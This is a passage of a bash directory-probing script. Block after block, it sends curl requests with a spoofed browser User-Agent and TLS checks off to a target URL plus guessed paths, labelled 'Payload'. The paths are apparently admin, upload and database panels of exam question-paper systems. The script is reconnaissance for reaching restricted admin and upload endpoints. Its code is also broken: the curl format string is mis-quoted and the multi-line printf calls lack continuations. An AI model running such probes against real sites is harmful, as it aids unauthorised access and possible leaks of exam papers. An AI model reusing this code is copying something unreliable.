code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
